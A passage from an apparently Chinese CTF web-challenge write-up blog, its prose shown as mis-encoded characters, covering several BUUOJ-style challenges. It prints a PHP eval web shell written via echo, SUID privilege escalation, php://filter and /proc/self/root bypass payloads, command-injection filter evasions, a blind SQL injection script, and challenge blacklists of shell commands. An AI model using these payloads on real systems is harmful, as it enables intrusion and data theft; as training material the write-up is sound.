class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥å¯¹cmdæ‰§è¡Œå‘½ä»¤æ— å›æ˜¾</p><p>å°è¯•å†™å…¥shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_POST[&#x27;key&#x27;]);?&gt;&#x27; &gt; shell.php</span><br></pre></td></tr></table></figure><p>å†™å…¥æˆåŠŸ</p><p><img src="/../images/image-20240120111932182.png" alt="image-20240120111932182"></p><p>ls &#x2F;æŸ¥çœ‹</p><p><img src="/../images/image-20240120112025842.png" alt="image-20240120112025842"></p><p>ä½†æ˜¯flagæ–‡ä»¶æ˜¯çœ‹ä¸äº†çš„</p><p>çœ‹å…¶ä»–å¸ˆå‚…çš„WPè¿™é‡Œéœ€è¦SUIDææƒ</p><p>èšå‰‘è¿æ¥ï¼Œå¯ä»¥çœ‹åˆ°flagæ–‡ä»¶åªæœ‰rootç”¨æˆ·æ‰èƒ½æŸ¥çœ‹</p><p><img src="/../images/image-20240120112358591.png" alt="image-20240120112358591"></p><p>æ‰¾åˆ°ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå‘ç°&#x2F;bin&#x2F;dateæœ‰sæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240120112714663.png" alt="image-20240120112714663"></p><p>åˆ©ç”¨dateè¯»å–flag</p><p><img src="/../images/image-20240120112841974.png" alt="image-20240120112841974"></p><h1 id="VNCTF2023-è±¡æ£‹ç‹å­"><a href="#VNCTF2023-è±¡æ£‹ç‹å­" class="headerlink" title="[VNCTF2023]è±¡æ£‹ç‹å­"></a>[VNCTF2023]è±¡æ£‹ç‹å­</h1><p>æ§åˆ¶å°æ‰§è¡Œ</p><p><img src="/../images/image-20240120113536028.png" alt="image-20240120113536028"></p><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-æ³„æ¼çš„ç§˜å¯†"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]æ³„æ¼çš„ç§˜å¯†"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]æ³„æ¼çš„ç§˜å¯†</h1><p><img src="/../images/image-20240120192931169.png" alt="image-20240120192931169"></p><p>robots.txt</p><p><img src="/../images/image-20240120192943768.png" alt="image-20240120192943768"></p><p><a href="http://www.zip/">www.zip</a></p><p><img src="/../images/image-20240120193609628.png" alt="image-20240120193609628"></p><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-include-0ã€‚0"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-include-0ã€‚0" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]include 0ã€‚0"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]include 0ã€‚0</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨<em>php:&#x2F;&#x2F;filter</em>&#x2F;convert.base64-decode&#x2F;resourceæ¥è¯»å–çš„è¯ä¼šè§¦å‘æ­£åˆ™</p><p>å¯ä»¥ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF-8.UTF-7/resource=flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php</span><br></pre></td></tr></table></figure><p>æ¥ç»•è¿‡</p><p><img src="/../images/image-20240120195726061.png" alt="image-20240120195726061"></p><h1 id="VNCTF2023-ç”µå­æœ¨é±¼"><a href="#VNCTF2023-ç”µå­æœ¨é±¼" class="headerlink" title="[VNCTF2023]ç”µå­æœ¨é±¼"></a>[VNCTF2023]ç”µå­æœ¨é±¼</h1><p>Rustä»£ç å®¡è®¡</p><p>å…³é”®ä»£ç </p><p><img src="/../images/image-20240120222356389.png" alt="image-20240120222356389"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cost *= body.quantity;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GONGDE.set(GONGDE.get() - cost as i32);</span><br></pre></td></tr></table></figure><p>costæ˜¯int32ç±»å‹å˜é‡ï¼Œåªè¦cost*quantity &gt;&#x3D; int32æœ€å¤§å€¼(214748368)å°±å¯ä»¥æº¢å‡ºã€‚</p><p>åœ¨Rustä¸­ï¼Œæ•´æ•°è¿›è¡Œæ•´æ•°æº¢å‡ºåä¼šå˜æˆè´Ÿæ•°ï¼Œé‚£ä¹ˆä½¿quantityæº¢å‡ºåå˜æˆè´Ÿæ•°ï¼Œcostæœ€ç»ˆä¹Ÿä¼šå˜æˆè´Ÿæ•°ï¼Œå‡å°±å˜æˆäº†åŠ ã€‚</p><p><img src="/../images/image-20240120223623596.png" alt="image-20240120223623596"></p><p><img src="/../images/image-20240120224148309.png" alt="image-20240120224148309"></p><h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-medium-sql"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-medium-sql" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]medium_sql"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]medium_sql</h1><p>è¿‡æ»¤äº†unionï¼Œå¤§å°å†™æ··åˆç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition</span>(<span class="params">res</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">_url = <span class="string">&#x27;http://ccd60d07-ee0f-4932-98be-a19a07a223f9.node5.buuoj.cn:81/&#x27;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">for</span> _time <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;time:%d&quot;</span> % (_time))</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> (right &gt; left):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># è·å–å½“å‰åº“è¡¨å</span></span><br><span class="line">        <span class="comment"># url = f&quot;&#123;_url&#125;?id=TMP0919&#x27; And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom &#123;_time&#125; FOr 1))))In(&#123;mid&#125;)),1,0)%23&quot;</span></span><br><span class="line">        url = <span class="string">f&quot;<span class="subst">&#123;_url&#125;</span>?id=TMP0919&#x27; And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom <span class="subst">&#123;_time&#125;</span> FOr 1))))In(<span class="subst">&#123;mid&#125;</span>)),1,0)%23&quot;</span></span><br><span class="line">        <span class="comment"># è·å–å­—æ®µå</span></span><br><span class="line">        <span class="comment"># url = f&quot;&#123;_url&#125;?id=TMP0919&#x27; And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In (&#x27;here_is_flag&#x27;))) fRom &#123;_time&#125; FOr 1))))In(&#123;mid&#125;)),1,0)%23&quot;</span></span><br><span class="line">        <span class="comment"># è·å–å­—æ®µå€¼</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        res = requests.get(url=url)</span><br><span class="line">        <span class="keyword">if</span> (condition(res)):</span><br><span class="line">            result += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># è·å–å½“å‰åº“è¡¨å</span></span><br><span class="line">            <span class="comment"># url = f&quot;&#123;_url&#125;?id=TMP0919&#x27; And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom &#123;_time&#125; FOr 1))))&gt;(&#123;mid&#125;)),1,0)%23&quot;</span></span><br><span class="line">            <span class="comment"># è·å–å­—æ®µå</span></span><br><span class="line">            <span class="comment"># url = f&quot;&#123;_url&#125;?id=TMP0919&#x27; And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In (&#x27;here_is_flag&#x27;))) fRom &#123;_time&#125; FOr 1))))&gt;(&#123;mid&#125;)),1,0)%23&quot;</span></span><br><span class="line">            <span class="comment"># è·å–å­—æ®µå€¼</span></span><br><span class="line">            url = <span class="string">f&quot;<span class="subst">&#123;_url&#125;</span>?id=TMP0919&#x27; And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom <span class="subst">&#123;_time&#125;</span> FOr 1))))&gt;(<span class="subst">&#123;mid&#125;</span>)),1,0)%23&quot;</span></span><br><span class="line">            res = requests.get(url=url)</span><br><span class="line">            <span class="keyword">if</span> (condition(res)):</span><br><span class="line">                left = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240120224852416.png" alt="image-20240120224852416"></p><h1 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-So-Baby-RCE"><a href="#NewStarCTF-å…¬å¼€èµ›èµ›é“-So-Baby-RCE" class="headerlink" title="[NewStarCTF å…¬å¼€èµ›èµ›é“]So Baby RCE"></a>[NewStarCTF å…¬å¼€èµ›èµ›é“]So Baby RCE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>%0aå‘½ä»¤åˆ†éš”ç¬¦,$1ç©ºå˜é‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0acd%09..%0acd%09..%0acd%09..%0als</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0acd%09..%0acd%09..%0acd%09..%0asort%09ffff$1llllaaaaggggg</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240120230935127.png" alt="image-20240120230935127"></p><p><img src="/../images/image-20240120231003601.png" alt="image-20240120231003601"></p><h1 id="Dest0g3-520è¿æ–°èµ›-phpdest"><a href="#Dest0g3-520è¿æ–°èµ›-phpdest" class="headerlink" title="[Dest0g3 520è¿æ–°èµ›]phpdest"></a>[Dest0g3 520è¿æ–°èµ›]phpdest</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>require_onceå¤šæ¬¡è½¯è¿æ¥ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240121131330572.png" alt="image-20240121131330572"></p><p><img src="/../images/image-20240121131347778.png" alt="image-20240121131347778"></p><h1 id="Dest0g3-520è¿æ–°èµ›-EasyPHP"><a href="#Dest0g3-520è¿æ–°èµ›-EasyPHP" class="headerlink" title="[Dest0g3 520è¿æ–°èµ›]EasyPHP"></a>[Dest0g3 520è¿æ–°èµ›]EasyPHP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…³é”®åœ¨äºset_error_handlerå®šä¹‰äº†ä¸€ä¸ªé”™è¯¯å¤„ç†å‡½æ•°ï¼Œè§¦å‘é”™è¯¯å°±èƒ½è¾“å‡ºflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fl4g .= $dest0g3</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ•°ç»„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf[]=1</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><p><img src="/../images/image-20240121131941599.png" alt="image-20240121131941599"></p><h1 id="Dest0g3-520è¿æ–°èµ›-SimpleRCE"><a href="#Dest0g3-520è¿æ–°èµ›-SimpleRCE" class="headerlink" title="[Dest0g3 520è¿æ–°èµ›]SimpleRCE"></a>[Dest0g3 520è¿æ–°èµ›]SimpleRCE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æ— å‚æ•°RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa=show_source(next(apache_request_headers()));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240121152921809.png" alt="image-20240121152921809"></p><h1 id="DASCTF-Sept-X-æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ›-hellounser"><a href="#DASCTF-Sept-X-æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ›-hellounser" class="headerlink" title="[DASCTF Sept X æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ›]hellounser"></a>[DASCTF Sept X æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ›]hellounser</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$this</span>-&gt;func) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="variable">$this</span>-&gt;arg)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No!No!No!&#x27;</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">            <span class="comment">//There is no code to print flag in flag.php</span></span><br><span class="line">            <span class="variable">$func</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable language_">$this</span>-&gt;arg); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Nice Job!!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$aaa</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$aaa</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æ­£å¸¸æ„é€ popé“¾å³å¯ï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬æœ€ç»ˆéœ€è¦åˆ©ç”¨$func(â€˜â€™, $this-&gt;arg)æ‰§è¡Œä»£ç 